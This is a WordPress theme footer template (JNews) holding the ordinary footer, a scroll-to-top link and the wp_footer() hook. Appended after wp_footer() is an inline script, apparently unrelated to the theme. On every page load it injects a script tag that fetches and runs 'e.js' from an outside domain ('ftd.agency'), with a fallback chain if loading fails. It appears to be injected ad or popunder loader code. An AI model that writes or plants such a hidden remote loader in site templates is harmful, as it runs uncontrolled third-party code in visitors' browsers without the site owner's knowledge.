        <div class="footer-holder" id="footer" data-id="footer">
            <?php
            $footer_style = get_theme_mod('jnews_footer_style', '1');
            if ($footer_style === 'custom') {
                get_template_part('fragment/footer/footer-custom');
            } else {
                get_template_part('fragment/footer/footer-' . $footer_style);
            }
            ?>
        </div>

        <div class="jscroll-to-top">
            <a href="#back-to-top" class="jscroll-to-top_link"><i class="fa fa-angle-up"></i></a>
        </div>
        </div>

        <?php

        if (apply_filters('jnews_can_render_account_popup', false)) {
            get_template_part('fragment/account/account-popup');
        }

        wp_footer();
        ?>
        <div id='zone_1623503952'></div>
        <script>
            (function(w, d, o, g, r, a, m) {
                var cid = 'zone_1623503952';
                w[r] = w[r] || function() {
                    (w[r + 'l'] = w[r + 'l'] || []).push(arguments)
                };

                function e(b, w, r) {
                    if ((w[r + 'h'] = b.pop()) && !w.ABN) {
                        var a = d.createElement(o),
                            p = d.getElementsByTagName(o)[0];
                        a.async = 1;
                        a.src = 'https://cdn.' + w[r + 'h'] + '/libs/e.js';
                        a.onerror = function() {
                            e(g, w, r)
                        };
                        p.parentNode.insertBefore(a, p)
                    }
                }
                e(g, w, r);
                w[r](cid, {
                    id: 1623503952,
                    domain: w[r + 'h']
                });
            })(window, document, 'script', ['ftd.agency'], 'ABNS');
        </script>
        </body>

        </html>